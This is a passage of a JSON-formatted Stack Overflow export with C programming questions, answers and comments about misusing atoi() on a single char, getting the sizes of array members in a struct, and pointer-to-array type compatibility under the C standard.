clarification"}, {"owner": {"reputation": 458, "user_id": 8420233, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/5JX6a.png?s=128&g=1", "display_name": "absoluteAquarian", "link": "https://stackoverflow.com/users/8420233/absoluteaquarian"}, "reply_to_user": {"reputation": 3, "user_id": 10776338, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-Nw1MD3haZXk/AAAAAAAAAAI/AAAAAAAAAAA/AGDgw-iye1Vc_xim5HU7z6y2325fo-78RQ/mo/photo.jpg?sz=128", "display_name": "Curfew", "link": "https://stackoverflow.com/users/10776338/curfew"}, "edited": false, "score": 0, "creation_date": 1544624901, "post_id": 53744715, "comment_id": 94342710, "body": "@Curfew if this answer helped you, it would be much appreciated if you could <i>accept it as the answer</i> by clicking the gray <b><i>check mark</i></b> under the vote count."}, {"owner": {"reputation": 3, "user_id": 10776338, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-Nw1MD3haZXk/AAAAAAAAAAI/AAAAAAAAAAA/AGDgw-iye1Vc_xim5HU7z6y2325fo-78RQ/mo/photo.jpg?sz=128", "display_name": "Curfew", "link": "https://stackoverflow.com/users/10776338/curfew"}, "reply_to_user": {"reputation": 458, "user_id": 8420233, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/5JX6a.png?s=128&g=1", "display_name": "absoluteAquarian", "link": "https://stackoverflow.com/users/8420233/absoluteaquarian"}, "edited": false, "score": 0, "creation_date": 1544625692, "post_id": 53744715, "comment_id": 94343189, "body": "@Tau sorry didn&#39;t know about that, marked it as the answer now"}], "tags": [], "owner": {"reputation": 27420, "user_id": 4756299, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e38adc5559df095cfe10c664916e8ffa?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Henle", "link": "https://stackoverflow.com/users/4756299/andrew-henle"}, "is_accepted": true, "score": 1, "last_activity_date": 1544624177, "last_edit_date": 1544624177, "creation_date": 1544623229, "answer_id": 53744715, "question_id": 53744585, "link": "https://stackoverflow.com/questions/53744585/facing-problems-with-the-atoi-function-if-used-repeatedly/53744715#53744715", "title": "Facing problems with the atoi function if used repeatedly", "body": "<p>Per <a href=\"https://port70.net/~nsz/c/c11/n1570.html#7.22.1.2\" rel=\"nofollow noreferrer\">the <code>atoi()</code> documentation in the C standard</a>:</p>\n\n<blockquote>\n  <p>The atoi, atol, and atoll functions convert the <strong>initial portion of the string pointed to by nptr</strong> to int, long int, and long long int representation, respectively.</p>\n</blockquote>\n\n<p>Note the bolded part.</p>\n\n<p>Given</p>\n\n<pre><code>char text;\n</code></pre>\n\n<p>this code invokes undefined behavior because the address passed to <code>atoi()</code> is not that of a string:</p>\n\n<pre><code>int num = atoi(&amp;text);\n</code></pre>\n\n<p>One fix would be:</p>\n\n<pre><code>char text[2];\ntext[1] = '\\0';\n\n// getchar() returns int, not char, in order\n// to handle EOF properly\nint input = getchar();\nwhile(input != EOF)\n{\n    text[0] = input;\n    if(isdigit(text[0]))\n    {\n        printf(\"text is %s \",text);\n        int num = atoi(text);\n</code></pre>\n\n<p>That ensures that a <strong>string</strong> (a nul-terminated series of <code>char</code>) is passed to <code>atoi()</code>.</p>\n"}, {"comments": [{"owner": {"reputation": 3, "user_id": 10776338, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-Nw1MD3haZXk/AAAAAAAAAAI/AAAAAAAAAAA/AGDgw-iye1Vc_xim5HU7z6y2325fo-78RQ/mo/photo.jpg?sz=128", "display_name": "Curfew", "link": "https://stackoverflow.com/users/10776338/curfew"}, "edited": false, "score": 0, "creation_date": 1544625460, "post_id": 53745045, "comment_id": 94343051, "body": "@wildpasser wow, never thought of break, continue and using arr[num]++ to replace the loop, thank you"}], "tags": [], "owner": {"reputation": 37954, "user_id": 905902, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a18869332564b1c3dfad9586d37095b2?s=128&d=identicon&r=PG", "display_name": "wildplasser", "link": "https://stackoverflow.com/users/905902/wildplasser"}, "is_accepted": false, "score": 1, "last_activity_date": 1544624319, "creation_date": 1544624319, "answer_id": 53745045, "question_id": 53744585, "link": "https://stackoverflow.com/questions/53744585/facing-problems-with-the-atoi-function-if-used-repeatedly/53745045#53745045", "title": "Facing problems with the atoi function if used repeatedly", "body": "<ul>\n<li>you don't need <code>atoi()</code> since you are dealing with single characters, not with strings</li>\n<li>getc()returns an int [0 .. 255 for actual characters, -1 for EOF]</li>\n<li>you can avoid a lot of <code>{}</code> braces by using <code>break</code> and <code>continue</code></li>\n</ul>\n\n<hr>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;ctype.h&gt;\n\nint main() {\n    int arr[10] = {0};\n    int text, num;\n   while(1) {\n        text = getchar();\n        if (text == EOF) break;\n        if (!isdigit(text)) continue;\n        printf(\"text is %c \", text);\n        num = text - '0'\n        printf(\"num is %d\\n \",num);\n        arr[num]++;\n        //printf(\"arr[%d] is %d\\n\", num, arr[num]);\n    }\n    for(int i=0; i&lt;10;i++)\n    {\n        printf(\"%d \",arr[i]);\n    }\n\n    return 0;\n}\n</code></pre>\n"}], "owner": {"reputation": 3, "user_id": 10776338, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-Nw1MD3haZXk/AAAAAAAAAAI/AAAAAAAAAAA/AGDgw-iye1Vc_xim5HU7z6y2325fo-78RQ/mo/photo.jpg?sz=128", "display_name": "Curfew", "link": "https://stackoverflow.com/users/10776338/curfew"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 124, "favorite_count": 0, "accepted_answer_id": 53744715, "answer_count": 2, "score": 0, "last_activity_date": 1544624319, "creation_date": 1544622826, "question_id": 53744585, "link": "https://stackoverflow.com/questions/53744585/facing-problems-with-the-atoi-function-if-used-repeatedly", "title": "Facing problems with the atoi function if used repeatedly", "body": "<p>I have to find the frequency of digits {0,1,2,3,4,5,6,7,8,9} in a given string, I'm using <strong>atoi</strong> function  to convert the character to an integer and I'm having problems with the <strong>atoi</strong> function when the input string is large (tried this with different test cases of varying length),</p>\n\n<p>for example if the input string is </p>\n\n<pre><code>1v88886l256338ar0ekk\n</code></pre>\n\n<p>my code works properly and the answer is </p>\n\n<pre><code>1 1 1 2 0 1 2 0 5 0\n</code></pre>\n\n<p>where the 1st digit indicates the frequency of 0 and so on upto 9,</p>\n\n<p>but if the input string is</p>\n\n<pre><code>9139f793308o0lo66h6vc13lgc697h0f6c32lu84445972k0o0l033od17c083yn5051d6j319hyo8j939n28d913015ns6zx5653x01211x12ch2526o65sg7xw6302141q9203s22l336319ll9yx4b597mr318a7943906750j4u152067nq83ne9f24thu96yd05173l47c803roxci45615f0w53i1sz913jj6za733l73tw6r66mq6p44sfhjr26h8e801z8zlcx2l1e65r2879xj3w3acv216196uq158o663y7oz2i5378v0v5w17762451t424352m23026r9o202i9785382o159e4gu1c8561157z5f1vqs5755465b8u728u956434mv944885li456628a994u7j5278m269n1pk8e46940q834h06il6h447888tr7ig72z10fe09k5g98h9bgt6z40v42s16pt6k3l3v45i83i01b9448g554741w766f2q7v31i085488h060e710p53076c6nm98pi946g8j2n6j8x29qa1ad48172y0u4818121p686bud89741201p54087u56g8scerv9pvhuo09re477zfb224i2c1325bj58jx4bk7b009f6446j5i95474p266i503r670n631x6940gwl71ejbx47imx576129248901765rnpu6l80084t0j1839f5y3409w2n403fu6ogw1170jmb6o5l520vg0703e0\n</code></pre>\n\n<p>upon reaching the end of the string the <strong>atoi</strong> function returns wrong values </p>\n\n<p>for example,</p>\n\n<p>my code uses <strong>atoi</strong> to convert <strong>char text</strong> to an integer and stores it into <strong>int num</strong> </p>\n\n<p>at the beginning the function works fine,</p>\n\n<pre><code>text is 9 num is 9 \ntext is 1 num is 1 \ntext is 3 num is 3 \ntext is 9 num is 9 \ntext is 7 num is 7 \ntext is 9 num is 9 \ntext is 3 num is 3 \ntext is 3 num is 3 \ntext is 0 num is 0 \ntext is 8 num is 8 \ntext is 0 num is 0 \n.\n.\n.\n</code></pre>\n\n<p>and upon nearing the very end of the string the function returns</p>\n\n<pre><code>.\n.\n. \ntext is 2 num is 2 \ntext is 4 num is 4 \ntext is 0 num is 0 \ntext is 3 num is 30 \ntext is 6 num is 60 \ntext is 1 num is 10 \ntext is 1 num is 10 \ntext is 7 num is 70 \ntext is 0 num is 0 \ntext is 6 num is 61 \ntext is 5 num is 51 \ntext is 5 num is 51 \ntext is 2 num is 21 \ntext is 0 num is 1\ntext is 7 num is 71  \ntext is 0 num is 1 \ntext is 0 num is 1 \ntext is 3 num is 31 \n</code></pre>\n\n<p>If I replace <code>int num = atoi(&amp;text)</code> with <code>int num = text - '0'</code> my program works perfectly for all test cases,</p>\n\n<p>so can someone please tell me what went wrong and whether I have used the function incorrectly.\nPlease keep in mind I just want to know why <strong>atoi</strong> didn't work, hence I'm not looking for replacements for the function. </p>\n\n<p>I've included the snippet of my code below\n<div class=\"snippet\" data-lang=\"js\" data-hide=\"false\" data-console=\"true\" data-babel=\"false\">\r\n<div class=\"snippet-code\">\r\n<pre class=\"snippet-code-css lang-css prettyprint-override\"><code>#include &lt;stdio.h&gt;\r\n#include &lt;string.h&gt;\r\n#include &lt;math.h&gt;\r\n#include &lt;stdlib.h&gt;\r\n#include &lt;ctype.h&gt;\r\n\r\nint main() {\r\n    int arr[10] = {0};\r\n    char text;\r\n   text = getchar();\r\n   while(text != EOF)\r\n   {\r\n       if(isdigit(text))\r\n       {\r\n           printf(\"text is %c \",text);\r\n           int num = atoi(&amp;text);\r\n           printf(\"num is %d\\n \",num);\r\n           for(int i =0; i&lt;10;i++)\r\n           {\r\n               if(num==i)\r\n               {\r\n                   arr[i]++;\r\n                   //printf(\"arr[%d] is %d\\n\", i,arr[i]);\r\n                   break;\r\n               }\r\n           }\r\n       }\r\n       text = getchar();\r\n   }\r\nfor(int i=0; i&lt;10;i++)\r\n{\r\n    printf(\"%d \",arr[i]);\r\n}  \r\n    return 0;\r\n}</code></pre>\r\n</div>\r\n</div>\r\n</p>\n\n<p>Thanks in advance for taking the time to read and answer my question</p>\n"}, {"tags": ["c", "embedded"], "comments": [{"owner": {"reputation": 26680, "user_id": 1806780, "user_type": "registered", "accept_rate": 0, "profile_image": "https://i.stack.imgur.com/NCB41.jpg?s=128&g=1", "display_name": "Sami Kuhmonen", "link": "https://stackoverflow.com/users/1806780/sami-kuhmonen"}, "edited": false, "score": 3, "creation_date": 1544621893, "post_id": 53744274, "comment_id": 94340935, "body": "No, it\u2019s not possible. Pointers don\u2019t carry information about the items they point to"}, {"owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "reply_to_user": {"reputation": 26680, "user_id": 1806780, "user_type": "registered", "accept_rate": 0, "profile_image": "https://i.stack.imgur.com/NCB41.jpg?s=128&g=1", "display_name": "Sami Kuhmonen", "link": "https://stackoverflow.com/users/1806780/sami-kuhmonen"}, "edited": false, "score": 2, "creation_date": 1544622031, "post_id": 53744274, "comment_id": 94341022, "body": "@SamiKuhmonen Unless, it&#39;s a pointer to the array itself, is not it?"}, {"owner": {"reputation": 26680, "user_id": 1806780, "user_type": "registered", "accept_rate": 0, "profile_image": "https://i.stack.imgur.com/NCB41.jpg?s=128&g=1", "display_name": "Sami Kuhmonen", "link": "https://stackoverflow.com/users/1806780/sami-kuhmonen"}, "reply_to_user": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "edited": false, "score": 0, "creation_date": 1544622093, "post_id": 53744274, "comment_id": 94341060, "body": "@SouravGhosh No, a pointer is a pointer. If it\u2019s an array it has a specific size based on elements. But if you take a pointer to it it becomes just a pointer like any other."}, {"owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "reply_to_user": {"reputation": 26680, "user_id": 1806780, "user_type": "registered", "accept_rate": 0, "profile_image": "https://i.stack.imgur.com/NCB41.jpg?s=128&g=1", "display_name": "Sami Kuhmonen", "link": "https://stackoverflow.com/users/1806780/sami-kuhmonen"}, "edited": false, "score": 1, "creation_date": 1544622158, "post_id": 53744274, "comment_id": 94341100, "body": "@SamiKuhmonen how about this? <code>int main(void) {     int arr[4] = {0};     int (*p)[4] = &amp;arr;     printf(&quot;%zu\\n&quot;, sizeof(*p));     return 0; }</code>"}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 2, "creation_date": 1544622483, "post_id": 53744274, "comment_id": 94341307, "body": "What is the actual problem you are trying to solve? Calculate the size of the whole struct minus padding, or what?"}, {"owner": {"reputation": 197, "user_id": 8027830, "user_type": "registered", "accept_rate": 44, "profile_image": "https://www.gravatar.com/avatar/cae119c87eb950f67dff9b757c1475f1?s=128&d=identicon&r=PG&f=1", "display_name": "MXG123", "link": "https://stackoverflow.com/users/8027830/mxg123"}, "edited": false, "score": 0, "creation_date": 1544623302, "post_id": 53744274, "comment_id": 94341791, "body": "Looking to loop through and update data. I was using pointer2 - pointer2 to get the data size. worked ok until I got to the last one as there is no plus one in the struct. I would prefer to use sizeof."}, {"owner": {"reputation": 13762, "user_id": 694733, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/0a3de8cd40d9ffb86cc1fed0c8cf2e19?s=128&d=identicon&r=PG", "display_name": "user694733", "link": "https://stackoverflow.com/users/694733/user694733"}, "edited": false, "score": 2, "creation_date": 1544623805, "post_id": 53744274, "comment_id": 94342062, "body": "Note that you cannot access contents of the structure with <code>numPtr</code> without breaking strict aliasing rules. That aside, this seems like an XY problem. It&#39;s unclear what you are really trying to do, but it sounds like your approach is not what you should be doing."}, {"owner": {"reputation": 197, "user_id": 8027830, "user_type": "registered", "accept_rate": 44, "profile_image": "https://www.gravatar.com/avatar/cae119c87eb950f67dff9b757c1475f1?s=128&d=identicon&r=PG&f=1", "display_name": "MXG123", "link": "https://stackoverflow.com/users/8027830/mxg123"}, "edited": false, "score": 0, "creation_date": 1544623858, "post_id": 53744274, "comment_id": 94342095, "body": "The sizes in the brackets are in the declaration. Is it possible to reference those?"}, {"owner": {"reputation": 206047, "user_id": 126769, "user_type": "registered", "accept_rate": 94, "profile_image": "https://i.stack.imgur.com/zBsgn.png?s=128&g=1", "display_name": "nos", "link": "https://stackoverflow.com/users/126769/nos"}, "edited": false, "score": 0, "creation_date": 1544626518, "post_id": 53744274, "comment_id": 94343718, "body": "@MXG123 Perhaps, it depends on what you are actually doing, or wanting to do. e.g. if you want to pass this to a function: <code>foo(sd.freq)</code> , you instead have to also pass the size explicittly. <code>foo(sd.freq, sizeof sd.freq)</code>. Please tell us why you need a pointer, and what you actually need to do  - perhaps there is a way."}, {"owner": {"reputation": 197, "user_id": 8027830, "user_type": "registered", "accept_rate": 44, "profile_image": "https://www.gravatar.com/avatar/cae119c87eb950f67dff9b757c1475f1?s=128&d=identicon&r=PG&f=1", "display_name": "MXG123", "link": "https://stackoverflow.com/users/8027830/mxg123"}, "edited": false, "score": 0, "creation_date": 1544629928, "post_id": 53744274, "comment_id": 94345832, "body": "I want to add a comma 0x2C  to the last element of each and 0x0D,0x0A to the very last one as this will make up a csv file. This will be done using a nested for loop but because the arrays are different sizes the inner loop count needs to be determined. I could use a list of the sizes but it will grow and be added to later. I just want to be able to update the struct and nothing else."}, {"owner": {"reputation": 1527, "user_id": 3518383, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/GjBCE.jpg?s=128&g=1", "display_name": "Juraj", "link": "https://stackoverflow.com/users/3518383/juraj"}, "edited": false, "score": 0, "creation_date": 1544697435, "post_id": 53744274, "comment_id": 94371733, "body": "<a href=\"https://stackoverflow.com/questions/3553296/sizeof-single-struct-member-in-c\" title=\"sizeof single struct member in c\">stackoverflow.com/questions/3553296/&hellip;</a>"}, {"owner": {"reputation": 2181, "user_id": 5598574, "user_type": "registered", "accept_rate": 81, "profile_image": "https://i.stack.imgur.com/aUJPQ.jpg?s=128&g=1", "display_name": "Hairi", "link": "https://stackoverflow.com/users/5598574/hairi"}, "edited": false, "score": 0, "creation_date": 1545323648, "post_id": 53744274, "comment_id": 94592432, "body": "You will have to turn the data into a string anyway, so use strlen(). So add one byte more for each segment and &#39;\\0&#39; char at the end. Thus you can use <code>strlen()</code>"}], "owner": {"reputation": 197, "user_id": 8027830, "user_type": "registered", "accept_rate": 44, "profile_image": "https://www.gravatar.com/avatar/cae119c87eb950f67dff9b757c1475f1?s=128&d=identicon&r=PG&f=1", "display_name": "MXG123", "link": "https://stackoverflow.com/users/8027830/mxg123"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 78, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1544696629, "creation_date": 1544621753, "question_id": 53744274, "link": "https://stackoverflow.com/questions/53744274/size-of-array-within-struct", "title": "Size of array within struct", "body": "<p>I have a struct of char arrays defined as follows:</p>\n\n<pre><code>    struct SD_Data {\n       char time[8];    \n       char vac[4];     \n       char vdc1[4];     \n       char vdc2[4];     \n       char freq1[4];   \n       char freq2[4];    \n       char freq3[4];    \n       char error_status[4];  \n       char run_status[10];  };\n\nstruct SD_Data sdData;\n\n  // data is put into struct here...\n</code></pre>\n\n<p>I want to use a variable within a loop that corresponds with the size of each array.</p>\n\n<p>Normally I can use:</p>\n\n<pre><code>size = sizeof(sdData.time);\nsize = sizeof(sdData.vac);\netc\n</code></pre>\n\n<p>Is there a way to replace the name with a pointer instead and increment the pointer as it gets the sizes of each array?</p>\n\n<p>I have tried by defining a pointer to the start of the strut and then getting the sizeof the deferenced pointer but only gives the size of the pointer</p>\n\n<pre><code>int* numPtr = (int*)&amp;sdData;\nsize = sizeof(*numPtr );\n</code></pre>\n\n<p>Thanks.</p>\n"}, {"tags": ["c", "arrays", "language-lawyer", "c11"], "comments": [{"owner": {"reputation": 64226, "user_id": 1898, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/e222c924e06cc579a6866f6d7588ca66?s=128&d=identicon&r=PG", "display_name": "Skizz", "link": "https://stackoverflow.com/users/1898/skizz"}, "edited": false, "score": 0, "creation_date": 1544620172, "post_id": 53743670, "comment_id": 94340014, "body": "In C, pointers are just numbers to the CPU, there is no additional information about what they&#39;re pointing to, and the language doesn&#39;t define any meta data either, so it doesn&#39;t matter about the size of what it&#39;s pointing to, just that the type is the same (and that&#39;s a compiler thing not a CPU thing)."}, {"owner": {"reputation": 23946, "user_id": 3100312, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/486be6e961e6c8a2e4705058600e666f?s=128&d=identicon&r=PG&f=1", "display_name": "Paul Ogilvie", "link": "https://stackoverflow.com/users/3100312/paul-ogilvie"}, "edited": false, "score": 0, "creation_date": 1544620392, "post_id": 53743670, "comment_id": 94340107, "body": "In your declaration of <code>subarray2</code>, <code>n</code> is only used for address calculations and does not result in storage allocation, e.g. in <code>subarray2++</code>, the size of <code>n</code> chars will be added. It could be considered that the compiler, when able, could give a warning when the assigned pointer points to an object that is not the same size as <code>n</code>, however, that would be a run-time isue, generally not a compile time issue."}, {"owner": {"reputation": 51929, "user_id": 1084774, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/13403db744d8aa130bb317576cc1df30?s=128&d=identicon&r=PG", "display_name": "PSkocik", "link": "https://stackoverflow.com/users/1084774/pskocik"}, "reply_to_user": {"reputation": 64226, "user_id": 1898, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/e222c924e06cc579a6866f6d7588ca66?s=128&d=identicon&r=PG", "display_name": "Skizz", "link": "https://stackoverflow.com/users/1898/skizz"}, "edited": false, "score": 1, "creation_date": 1544620585, "post_id": 53743670, "comment_id": 94340202, "body": "@Skizz Yes, but with C&#39;s type system it&#39;s never that easy, is it. Try changing the last <code>#if 0</code> to <code>#if 1</code> and you get a warning on that assignment (larger plain old array to smaller plain old array). Shouldn&#39;t matter if &quot;pointers are just numbers&quot; but to the compiler it somehow does."}, {"owner": {"reputation": 126278, "user_id": 6451573, "user_type": "moderator", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/4xczZ.jpg?s=128&g=1", "display_name": "Jean-Fran&#231;ois Fabre", "link": "https://stackoverflow.com/users/6451573/jean-fran%c3%a7ois-fabre"}, "edited": false, "score": 0, "creation_date": 1544620708, "post_id": 53743670, "comment_id": 94340264, "body": "maybe because there <i>could</i> be boundary check warnings or arrays, that you&#39;re cheating with this ?"}, {"owner": {"reputation": 51929, "user_id": 1084774, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/13403db744d8aa130bb317576cc1df30?s=128&d=identicon&r=PG", "display_name": "PSkocik", "link": "https://stackoverflow.com/users/1084774/pskocik"}, "reply_to_user": {"reputation": 23946, "user_id": 3100312, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/486be6e961e6c8a2e4705058600e666f?s=128&d=identicon&r=PG&f=1", "display_name": "Paul Ogilvie", "link": "https://stackoverflow.com/users/3100312/paul-ogilvie"}, "edited": false, "score": 0, "creation_date": 1544621185, "post_id": 53743670, "comment_id": 94340528, "body": "@PaulOgilvie It is a valid consideration that the dynamic <code>int n</code> might not be statically known (e.g, it could come from a function argument) and then the compiler can&#39;t check, but I wonder if there can ever be any issues even with the non-vla version. <code>char (*p)[n] = &amp;(char [N&#47;*N&gt;n*&#47;]){0}; &#47;*... use p*&#47;</code> doesn&#39;t look conformant as per strict aliasing rules but subarrays kind of are subobjects of larger arrays and you can&#39;t ever access them whole anyway (individual elements only) so maybe <code>char (*p)[n] = (void*)&amp;(char [N&#47;*N&gt;n*&#47;]){0}; &#47;*... use p*&#47;</code>  shouldn&#39;t ever lead to any issues."}, {"owner": {"reputation": 64226, "user_id": 1898, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/e222c924e06cc579a6866f6d7588ca66?s=128&d=identicon&r=PG", "display_name": "Skizz", "link": "https://stackoverflow.com/users/1898/skizz"}, "edited": false, "score": 0, "creation_date": 1544622588, "post_id": 53743670, "comment_id": 94341391, "body": "@PSkocik: if I&#39;m not mistaken (and that is always a possibility!) that code in that last #if does involve an assignment between two different types: an array of pointer to char and a pointer to a pointer to char so the compiler could easily spot that and generate warnings."}, {"owner": {"reputation": 139291, "user_id": 298225, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/ef102f4ee36e58d09e0b27cd5393a1d8?s=128&d=identicon&r=PG", "display_name": "Eric Postpischil", "link": "https://stackoverflow.com/users/298225/eric-postpischil"}, "reply_to_user": {"reputation": 64226, "user_id": 1898, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/e222c924e06cc579a6866f6d7588ca66?s=128&d=identicon&r=PG", "display_name": "Skizz", "link": "https://stackoverflow.com/users/1898/skizz"}, "edited": false, "score": 1, "creation_date": 1544623476, "post_id": 53743670, "comment_id": 94341886, "body": "@Skizz: In C, pointers are <b>not</b> just numbers to the CPU, both because they have type information (which affects pointer arithmetic in C), and because <a href=\"https://stackoverflow.com/a/11714314/298225\">they are abstractions</a>."}, {"owner": {"reputation": 139291, "user_id": 298225, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/ef102f4ee36e58d09e0b27cd5393a1d8?s=128&d=identicon&r=PG", "display_name": "Eric Postpischil", "link": "https://stackoverflow.com/users/298225/eric-postpischil"}, "edited": false, "score": 2, "creation_date": 1544624233, "post_id": 53743670, "comment_id": 94342319, "body": "The code is not strictly conforming C because the constraints for assignment operators (C 2018 6.5.16.1 1) say the two pointers must be pointers to versions of compatible types, and the rules that might make pointers to two array types compatible (6.2.7 3) do not provide for that in the case of arrays of different specified lengths. (\u201cSpecified\u201d in this case includes the length having been determined by evaluating its size expression.)"}, {"owner": {"reputation": 51929, "user_id": 1084774, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/13403db744d8aa130bb317576cc1df30?s=128&d=identicon&r=PG", "display_name": "PSkocik", "link": "https://stackoverflow.com/users/1084774/pskocik"}, "reply_to_user": {"reputation": 139291, "user_id": 298225, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/ef102f4ee36e58d09e0b27cd5393a1d8?s=128&d=identicon&r=PG", "display_name": "Eric Postpischil", "link": "https://stackoverflow.com/users/298225/eric-postpischil"}, "edited": false, "score": 0, "creation_date": 1544624263, "post_id": 53743670, "comment_id": 94342336, "body": "@EricPostpischil I&#39;m thinking even for non-VL arrays, <code>int (*p)[3]=(char (*)[3])&amp;(int[4]){0}; &#47;*... use p in any way without casting*&#47;</code> shouldn&#39;t ever lead to any strict aliasing issues because while the pointed-to types are incompatible, to violate strict aliasing rules you&#39;d have to access an object through an L-value incompatible with its effective type, but there&#39;s no such thing as array-typed L-values in C. The arrays will always decay to a pointer to <code>int</code> and the <code>int</code>s really are there. What do you think?"}, {"owner": {"reputation": 64226, "user_id": 1898, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/e222c924e06cc579a6866f6d7588ca66?s=128&d=identicon&r=PG", "display_name": "Skizz", "link": "https://stackoverflow.com/users/1898/skizz"}, "reply_to_user": {"reputation": 139291, "user_id": 298225, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/ef102f4ee36e58d09e0b27cd5393a1d8?s=128&d=identicon&r=PG", "display_name": "Eric Postpischil", "link": "https://stackoverflow.com/users/298225/eric-postpischil"}, "edited": false, "score": 0, "creation_date": 1544628806, "post_id": 53743670, "comment_id": 94345087, "body": "@EricPostpischil: I was talking about the code the CPU sees at run time, the CPU doesn&#39;t know what language was used to create the code so they&#39;re just numbers. In the C language, it&#39;s only the compiler (and with some meta data, a debugger) that is ascociating a type with an address. That link is lost in the final executable. Some languages (Java, C# for example) do keep that link between type and address so type checks at run time are possible. Pointer arithmetic is something the compiler generates based on type information, to the CPU it&#39;s just adding two numbers together."}, {"owner": {"reputation": 139291, "user_id": 298225, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/ef102f4ee36e58d09e0b27cd5393a1d8?s=128&d=identicon&r=PG", "display_name": "Eric Postpischil", "link": "https://stackoverflow.com/users/298225/eric-postpischil"}, "reply_to_user": {"reputation": 64226, "user_id": 1898, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/e222c924e06cc579a6866f6d7588ca66?s=128&d=identicon&r=PG", "display_name": "Skizz", "link": "https://stackoverflow.com/users/1898/skizz"}, "edited": false, "score": 0, "creation_date": 1544631389, "post_id": 53743670, "comment_id": 94346752, "body": "@Skizz: (a) If you were talking about what the CPU says, then that is not \u201cIn C.\u201d (b) That is not true for all CPUs. Some CPUs use segmented address architectures, so addresses are not just single numbers. And there are other embellishments and variations of addressing schemes."}, {"owner": {"reputation": 51929, "user_id": 1084774, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/13403db744d8aa130bb317576cc1df30?s=128&d=identicon&r=PG", "display_name": "PSkocik", "link": "https://stackoverflow.com/users/1084774/pskocik"}, "reply_to_user": {"reputation": 64226, "user_id": 1898, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/e222c924e06cc579a6866f6d7588ca66?s=128&d=identicon&r=PG", "display_name": "Skizz", "link": "https://stackoverflow.com/users/1898/skizz"}, "edited": false, "score": 0, "creation_date": 1544631822, "post_id": 53743670, "comment_id": 94347009, "body": "@Skizz the issue with aliasing types is that it allows the compiler to assume a <code>restrict</code> and generate different code based on that. If you do <code>int f(int *X, short *Y){ *X=2; *Y=3; return *X; }</code> it can generate code that returns 2 as an intermediate because since X and Y can&#39;t alias, *Y=3 cannot change X. On the first sight, it looks like the same thing might happen with the subarray assignment/casting, but I don&#39;t think it can based on the letter of the standard because the standard defines strict aliasing in terms of lvalue accesses lvalue arrays don&#39;t exist because of array-2-pointer decay"}, {"owner": {"reputation": 64226, "user_id": 1898, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/e222c924e06cc579a6866f6d7588ca66?s=128&d=identicon&r=PG", "display_name": "Skizz", "link": "https://stackoverflow.com/users/1898/skizz"}, "reply_to_user": {"reputation": 139291, "user_id": 298225, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/ef102f4ee36e58d09e0b27cd5393a1d8?s=128&d=identicon&r=PG", "display_name": "Eric Postpischil", "link": "https://stackoverflow.com/users/298225/eric-postpischil"}, "edited": false, "score": 0, "creation_date": 1544688247, "post_id": 53743670, "comment_id": 94366945, "body": "@EricPostpischil: Ah, I see where the confusion has happened, sorry. Bah, people that read too many standards get so picky about grammar! (Joke)"}], "answers": [{"tags": [], "owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "is_accepted": true, "score": 3, "last_activity_date": 1544624457, 